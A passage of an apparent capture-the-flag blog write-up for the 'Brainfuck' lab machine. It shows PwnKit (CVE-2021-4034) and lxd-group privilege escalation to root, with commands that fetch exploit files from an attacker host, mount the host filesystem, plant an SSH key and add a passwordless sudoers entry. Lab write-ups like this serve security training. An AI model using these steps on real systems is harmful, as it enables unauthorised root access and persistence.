+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    main<span class="token punctuation">(</span><span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/7469231908054d779c450854debfd610" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">And like that, the root flag is owned.</span></span></p></div><pre id="https://www.notion.so/9c04c631dd8b4afa9c8f4d5fa4dd3ba9" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>orestis@brainfuck:~$</span></mark></span><span class="SemanticString"><span> python rsa.py
+
+n:  8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977
+pt: 24604052029401386049980296953784287079059245867880966944246662849341507003750
+pt(hex): 0x3665666331613564626238393034373531636536353636613330356262386566
+flag: 6efc1a5d************************</span></span></span></code></pre><div id="https://www.notion.so/2c2131cf8c9942a6a2e8f7f5720b4116" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/6bbf98963a5149ef878950fca0a858ef" class="Divider"></div><h3 id="https://www.notion.so/36f636a1e2534d9ab0ceb684b9d0533f" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/36f636a1e2534d9ab0ceb684b9d0533f"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Privilege Escalation:</span></span></h3><div id="https://www.notion.so/f804a9bdef0f46f6a086f97401c7468d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The intended exploit chain ends on the RSA decryption, as a path for root shell wasn’t designed by the creator. Because the box is now 7 years old, there are 2 ways to escalate to root.</span></span></p></div><div id="https://www.notion.so/f864a55adbb741a185835bc1d1c3691b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">CVE-2021-4034 PwnKit:</strong></span></span></p></div><div id="https://www.notion.so/6d29fd351dbd46e0a9858747b2cf9ada" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The first way is to exploit PwnKit. At this point it’s a pretty well-known exploit that plagues many old Linux servers, and many exploit code can be found. I’ll transfer </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/ly4k/PwnKit">this one</a></span><span class="SemanticString"> to the box.</span></span></p></div><pre id="https://www.notion.so/8ce2fd8d36d74b5692155c7bba3a8c66" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>orestis@brainfuck:/tmp$</span></mark></span><span class="SemanticString"><span> wget http://10.10.14.20:8000/main.zip
+
+--2024-02-27 14:05:25--  http://10.10.14.20:8000/main.zip
+Connecting to 10.10.14.20:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 6457 (6.3K) [application/zip]
+Saving to: ‘main.zip’
+
+main.zip                                                   100%[=================&gt;]   6.31K  --.-KB/s    in 0.002s  
+
+2024-02-27 14:05:26 (2.78 MB/s) - ‘main.zip’ saved [6457/6457]
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>orestis@brainfuck:/tmp$</span></mark></span><span class="SemanticString"><span> unzip main.zip 
+Archive:  main.zip
+55d60e381ef90463ed35f47af44bf7e2fbc150d4
+   creating: CVE-2021-4034-main/
+  inflating: CVE-2021-4034-main/.gitignore  
+  inflating: CVE-2021-4034-main/LICENSE  
+  inflating: CVE-2021-4034-main/Makefile  
+  inflating: CVE-2021-4034-main/README.md  
+  inflating: CVE-2021-4034-main/cve-2021-4034.c  
+  inflating: CVE-2021-4034-main/cve-2021-4034.sh  
+   creating: CVE-2021-4034-main/dry-run/
+  inflating: CVE-2021-4034-main/dry-run/Makefile  
+  inflating: CVE-2021-4034-main/dry-run/dry-run-cve-2021-4034.c  
+  inflating: CVE-2021-4034-main/dry-run/pwnkit-dry-run.c  
+  inflating: CVE-2021-4034-main/pwnkit.c</span></span></span></code></pre><div id="https://www.notion.so/fa2e597a460a4c8b8b6400affa903f77" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">gcc</code></span><span class="SemanticString"> and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">make</code></span><span class="SemanticString"> are both available, so I’ll compile it on the box and run it.</span></span></p></div><pre id="https://www.notion.so/4f9600dae0fa45d68e33463c671b665c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>orestis@brainfuck:/tmp/CVE-2021-4034-main$</span></mark></span><span class="SemanticString"><span> make
+
+cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
+cc -Wall    cve-2021-4034.c   -o cve-2021-4034
+echo &quot;module UTF-8// PWNKIT// pwnkit 1&quot; &gt; gconv-modules
+mkdir -p GCONV_PATH=.
+cp -f /bin/true GCONV_PATH=./pwnkit.so:.
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>orestis@brainfuck:/tmp/CVE-2021-4034-main$</span></mark></span><span class="SemanticString"><span> ./cve-2021-4034
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>#</span></mark></span><span class="SemanticString"><span> id
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare),1000(orestis)</span></span></span></code></pre><div id="https://www.notion.so/88b01c48dc5a406d8d628ec02ad91ddd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/d097a81c5ead4759b46a14a273cd3e30" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">LXD Group Abuse:</strong></span></span></p></div><div id="https://www.notion.so/c3c21286f1f645578df35e282265de31" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The other way is to abuse the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">lxd</code></span><span class="SemanticString"> group, which </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">orestis</code></span><span class="SemanticString"> is a member of.</span></span></p></div><pre id="https://www.notion.so/cf65231801a14694bf1f58ced1e90535" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>orestis@brainfuck:~$</span></mark></span><span class="SemanticString"><span> id
+
+uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare)</span></span></span></code></pre><div id="https://www.notion.so/da200dcb54f64d1f9691c4d192a3e6ec" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">HackTricks has a nice </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation">guide</a></span><span class="SemanticString"> on how to exploit this. I’ll first build an Alpine image following its walkthrough.</span></span></p></div><pre id="https://www.notion.so/136f479239664ace887e1f6a3f231778" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/brainfuck]
+└─$</span></mark></span><span class="SemanticString"><span> git clone https://github.com/saghul/lxd-alpine-builder     
+
+Cloning into &#x27;lxd-alpine-builder&#x27;...
+remote: Enumerating objects: 50, done.
+remote: Counting objects: 100% (8/8), done.
+remote: Compressing objects: 100% (6/6), done.
+remote: Total 50 (delta 2), reused 5 (delta 2), pack-reused 42
+Receiving objects: 100% (50/50), 3.11 MiB | 5.09 MiB/s, done.
+Resolving deltas: 100% (15/15), done.
+                                                                                                                                                                                                                                            
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/brainfuck]
+└─$</span></mark></span><span class="SemanticString"><span> cd lxd-alpine-builder            
+                                                                                                                                                                                                                                            
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/brainfuck/lxd-alpine-builder]
+└─$</span></mark></span><span class="SemanticString"><span> sed -i &#x27;s,yaml_path=&quot;latest-stable/releases/$apk_arch/latest-releases.yaml&quot;,yaml_path=&quot;v3.8/releases/$apk_arch/latest-releases.yaml&quot;,&#x27; build-alpine
+                                                                                                                                                                                                                                            
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/brainfuck/lxd-alpine-builder]
+└─$</span></mark></span><span class="SemanticString"><span> sudo ./build-alpine -a i686        
+                                                                                                                
+Determining the latest release... v3.8
+Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.8/main/x86
+Downloading alpine-keys-2.1-r1.apk
+tar: Ignoring unknown extended header keyword &#x27;APK-TOOLS.checksum.SHA1&#x27;
+tar: Ignoring unknown extended header keyword &#x27;APK-TOOLS.checksum.SHA1&#x27;
+tar: Ignoring unknown extended header keyword &#x27;APK-TOOLS.checksum.SHA1&#x27;
+tar: Ignoring unknown extended header keyword &#x27;APK-TOOLS.checksum.SHA1&#x27;
+tar: Ignoring unknown extended header keyword &#x27;APK-TOOLS.checksum.SHA1&#x27;
+tar: Ignoring unknown extended header keyword &#x27;APK-TOOLS.checksum.SHA1&#x27;
+tar: Ignoring unknown extended header keyword &#x27;APK-TOOLS.checksum.SHA1&#x27;
+tar: Ignoring unknown extended header keyword &#x27;APK-TOOLS.checksum.SHA1&#x27;
+tar: Ignoring unknown extended header keyword &#x27;APK-TOOLS.checksum.SHA1&#x27;
+tar: Ignoring unknown extended header keyword &#x27;APK-TOOLS.checksum.SHA1&#x27;
+tar: Ignoring unknown extended header keyword &#x27;APK-TOOLS.checksum.SHA1&#x27;
+tar: Ignoring unknown extended header keyword &#x27;APK-TOOLS.checksum.SHA1&#x27;
+tar: Ignoring unknown extended header keyword &#x27;APK-TOOLS.checksum.SHA1&#x27;
+tar: Ignoring unknown extended header keyword &#x27;APK-TOOLS.checksum.SHA1&#x27;
+tar: Ignoring unknown extended header keyword &#x27;APK-TOOLS.checksum.SHA1&#x27;
+tar: Ignoring unknown extended header keyword &#x27;APK-TOOLS.checksum.SHA1&#x27;
+tar: Ignoring unknown extended header keyword &#x27;APK-TOOLS.checksum.SHA1&#x27;
+tar: Ignoring unknown extended header keyword &#x27;APK-TOOLS.checksum.SHA1&#x27;
+Downloading apk-tools-static-2.10.6-r0.apk
+tar: Ignoring unknown extended header keyword &#x27;APK-TOOLS.checksum.SHA1&#x27;
+tar: Ignoring unknown extended header keyword &#x27;APK-TOOLS.checksum.SHA1&#x27;
+Downloading alpine-mirrors-3.5.9-r0.apk
+tar: Ignoring unknown extended header keyword &#x27;APK-TOOLS.checksum.SHA1&#x27;
+tar: Ignoring unknown extended header keyword &#x27;APK-TOOLS.checksum.SHA1&#x27;
+alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub: OK
+Verified OK
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  2941  100  2941    0     0    527      0  0:00:05  0:00:05 --:--:--   604
+--2024-02-27 22:57:22--  http://alpine.mirror.wearetriple.com/MIRRORS.txt
+Resolving alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)... 93.187.10.106, 2a00:1f00:dc06:10::106
+Connecting to alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)|93.187.10.106|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2941 (2.9K) [text/plain]
+Saving to: ‘/home/ch3ng/machines/brainfuck/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’
+
+/home/ch3ng/machines/brainfuck/lxd-alp 100%[========================================================================================================================================&gt;]   2.87K  --.-KB/s    in 0s      
+
+2024-02-27 22:57:23 (11.0 MB/s) - ‘/home/ch3ng/machines/brainfuck/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’ saved [2941/2941]
+
+Selecting mirror http://mirror.alwyzon.net/alpine//v3.8/main
+fetch http://mirror.alwyzon.net/alpine//v3.8/main/x86/APKINDEX.tar.gz
+(1/18) Installing musl (1.1.19-r11)
+(2/18) Installing busybox (1.28.4-r3)
+Executing busybox-1.28.4-r3.post-install
+(3/18) Installing alpine-baselayout (3.1.0-r0)
+Executing alpine-baselayout-3.1.0-r0.pre-install
+Executing alpine-baselayout-3.1.0-r0.post-install
+(4/18) Installing openrc (0.35.5-r5)
+Executing openrc-0.35.5-r5.post-install
+(5/18) Installing alpine-conf (3.8.0-r0)
+(6/18) Installing libressl2.7-libcrypto (2.7.5-r0)
+(7/18) Installing libressl2.7-libssl (2.7.5-r0)
+(8/18) Installing libressl2.7-libtls (2.7.5-r0)
+(9/18) Installing ssl_client (1.28.4-r3)
+(10/18) Installing zlib (1.2.11-r1)
+(11/18) Installing apk-tools (2.10.6-r0)
+(12/18) Installing busybox-suid (1.28.4-r3)
+(13/18) Installing busybox-initscripts (3.1-r4)
+Executing busybox-initscripts-3.1-r4.post-install
+(14/18) Installing scanelf (1.2.3-r0)
+(15/18) Installing musl-utils (1.1.19-r11)
+(16/18) Installing libc-utils (0.7.1-r0)
+(17/18) Installing alpine-keys (2.1-r1)
+(18/18) Installing alpine-base (3.8.5-r0)
+Executing busybox-1.28.4-r3.trigger
+OK: 7 MiB in 18 packages</span></span></span></code></pre><div id="https://www.notion.so/badb7c796d9f4bf5bb2694f7df248d63" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Then I’ll upload the image to the box and import it.</span></span></p></div><pre id="https://www.notion.so/ed5d63b0c6844c839469979e92e28247" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>orestis@brainfuck:~$</span></mark></span><span class="SemanticString"><span> wget http://10.10.14.20:8000/alpine-v3.8-i686-20240227_2257.tar.gz
+
+--2024-02-27 14:28:15--  http://10.10.14.20:8000/alpine-v3.8-i686-20240227_2257.tar.gz
+Connecting to 10.10.14.20:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2658415 (2.5M) [application/gzip]
+Saving to: ‘alpine-v3.8-i686-20240227_2257.tar.gz’
+
+alpine-v3.8-i686-20240227_2257.tar.gz                      100%[========================================================================================================================================&gt;]   2.54M   739KB/s    in 3.5s    
+
+2024-02-27 14:28:19 (739 KB/s) - ‘alpine-v3.8-i686-20240227_2257.tar.gz’ saved [2658415/2658415]
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>orestis@brainfuck:~$</span></mark></span><span class="SemanticString"><span> lxc image import ./alpine-v3.8-i686-20240227_2257.tar.gz --alias privesc
+
+Image imported with fingerprint: 21b326d6ac316c0e1ad220389c51301f0f39af98f97dd93351aff2e8e34bfc92</span></span></span></code></pre><div id="https://www.notion.so/dc5088dab08a46e2bb256a46ad36c6cf" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">When creating the container, it’s important to have </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">security.privileged</code></span><span class="SemanticString"> set to true, as it forces the container to interact with the host as root. The second command mounts the hosts’ filesystem onto the container.</span></span></p></div><pre id="https://www.notion.so/67fb7018b9cc469b83c4bf4e572c853d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>orestis@brainfuck:~$</span></mark></span><span class="SemanticString"><span> lxc init privesc privesc -c security.privileged=true
+
+Creating privesc
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>orestis@brainfuck:~$</span></mark></span><span class="SemanticString"><span> lxc config device add privesc privesc disk source=/ path=/mnt/root recursive=true
+
+Device privesc added to privesc</span></span></span></code></pre><div id="https://www.notion.so/dc6de9f087044e68a4903f7ae4f38dfa" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Finally I’ll start the container and drop into a root shell within it.</span></span></p></div><pre id="https://www.notion.so/40b02365ab2045e2a61a8f4340eb00a0" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>orestis@brainfuck:~$</span></mark></span><span class="SemanticString"><span> lxc start privesc
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>orestis@brainfuck:~$</span></mark></span><span class="SemanticString"><span> lxc exec privesc /bin/sh
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>~ #</span></mark></span><span class="SemanticString"><span> id &amp;&amp; hostname
+
+uid=0(root) gid=0(root)
+privesc</span></span></span></code></pre><div id="https://www.notion.so/cc8a225b1c8b437a8af1a09e6fad0b47" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The root directory is now accessible at </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/mnt/root/root/</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/ddf3fe31f6dc489eb98f20982e7b6b86" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>~ #</span></mark></span><span class="SemanticString"><span> ls -la /mnt/root/root
+
+total 36
+drwx------    5 root     root          4096 Feb 27 12:34 .
+drwxr-xr-x   23 root     root          4096 Sep 15  2022 ..
+lrwxrwxrwx    1 root     root             9 Sep 15  2022 .bash_history -&gt; /dev/null
+-rw-r--r--    1 root     root          3106 Oct 22  2015 .bashrc
+drwx------    2 root     root          4096 May  5  2017 .cache
+-rw-------    1 root     root            66 Oct  3  2022 .mysql_history
+drwxr-xr-x    2 root     root          4096 Oct  3  2022 .nano
+-rw-r--r--    1 root     root           148 Aug 17  2015 .profile
+drwxr-xr-x    2 root     root          4096 Feb 27 12:35 .ssh
+-r--------    1 root     root            33 Apr 29  2017 root.txt</span></span></span></code></pre><div id="https://www.notion.so/60ee6c7bfec54ef1b37e1c007a9dd583" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It has a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.ssh</code></span><span class="SemanticString"> directory, so I’ll add my public key there.</span></span></p></div><pre id="https://www.notion.so/30b37d3fe6544cefa81bcc953286c653" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>~ #</span></mark></span><span class="SemanticString"><span> cd /mnt/root/root
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>/mnt/root/root #</span></mark></span><span class="SemanticString"><span> mkdir .ssh
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>/mnt/root/root #</span></mark></span><span class="SemanticString"><span> cd .ssh
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>/mnt/root/root/.ssh #</span></mark></span><span class="SemanticString"><span> echo &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPdVw/K7t0VK2aS6itQI70esbea87i+X9Ena3/gxD8Chs4o2pN15g/M7/uJc5IYuF7zgvSpwNHLQg0uZBP84FXxC2UXNJbNbgBU0sQf2URZow66dTyliHgw6whbXWgpETB+4uiNaXhb5EFqiqAi1iIooL3QsU0JeVNteQFff+s
+
+fkLhpkoGUu5NsPJLq9y2QEA0/vqGy8FiRenSWt/SRslsLWASMtyPvUtSK79kR0WbAPLkmBRHwXHWN8Od/MzKtoksmPlM65bWu6DCFeGg9Ugotj6GNk+O15+Z/1Z4YHsjgZG2vvbuwjmhh4Ckr8sRCFGhyHsdmGxkxYeT9xytd6pn root@brainfuck&#x27; &gt; authorized_keys
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>/mnt/root/root/.ssh #</span></mark></span><span class="SemanticString"><span> chmod 600 authorized_keys</span></span></span></code></pre><div id="https://www.notion.so/49e3a8d3e9fb408cba0bc0349c76eab5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">However, I still couldn’t SSH in as root. This is due to the SSH configuration on the box, which explicitly disabled root login.</span></span></p></div><pre id="https://www.notion.so/2059e544b949484582b65a89eb0cc374" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>/mnt/root/root/.ssh #</span></mark></span><span class="SemanticString"><span> cat /mnt/root/etc/ssh/sshd_config  | grep PermitRootLogin
+
+PermitRootLogin no
+# the setting of &quot;PermitRootLogin without-password&quot;.</span></span></span></code></pre><div id="https://www.notion.so/1bf3379c59b848cf9132fbf24f832a45" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With control over the filesystem, I can modify the config file to allow root login.</span></span></p></div><pre id="https://www.notion.so/0d0ed0d20bdb40b79aba22e82aaaea8d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>/mnt/root/root/.ssh #</span></mark></span><span class="SemanticString"><span> sed -i &#x27;s/^PermitRootLogin no/PermitRootLogin yes/&#x27; /mnt/root/etc/ssh/sshd_config</span></span></span></code></pre><div id="https://www.notion.so/e1c62cfb455f4c76a00729d5e2b45fd9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">However, the change only takes effect after the SSH service restarts, and there’s no way for me to trigger this. Instead, I can edit </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/sudoers</code></span><span class="SemanticString"> to allow </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">orestis</code></span><span class="SemanticString"> run anything as root without password.</span></span></p></div><pre id="https://www.notion.so/08abc48b14e54da9a59797244dcee717" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>/mnt/root/root/.ssh #</span></mark></span><span class="SemanticString"><span> echo &quot;orestis ALL=(ALL) NOPASSWD: ALL&quot; &gt;&gt; /mnt/root/etc/sudoers</span></span></span></code></pre><div id="https://www.notion.so/10790ea33c5444fbbb2987e551665eda" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Back in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">orestis</code></span><span class="SemanticString">&#x27; shell, running </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">sudo -i</code></span><span class="SemanticString"> resulted in a root shell.</span></span></p></div><pre id="https://www.notion.so/a3c398228786455bbfbf2210a4ded908" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>orestis@brainfuck:~$</span></mark></span><span class="SemanticString"><span> sudo -i
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>root@brainfuck:~#</span></mark></span><span class="SemanticString"><span> id
+
+uid=0(root) gid=0(root) groups=0(root)</span></span></span></code></pre><div id="https://www.notion.so/4fb04e2131ec4c2a8bea28d9d552bd89" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/695472b39b4c481a9f308c0cd8ed0248" class="Divider"></div></article>
+  <footer class="Footer">
+  <div>&copy; C:\Users\ch3ng &gt;_ 2024</div>
+  <div>&centerdot;</div>
+  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
+      rel="noopener noreferrer">Notablog</a>.
+  </div>
+</footer>
+
+</body>
+
+</html>
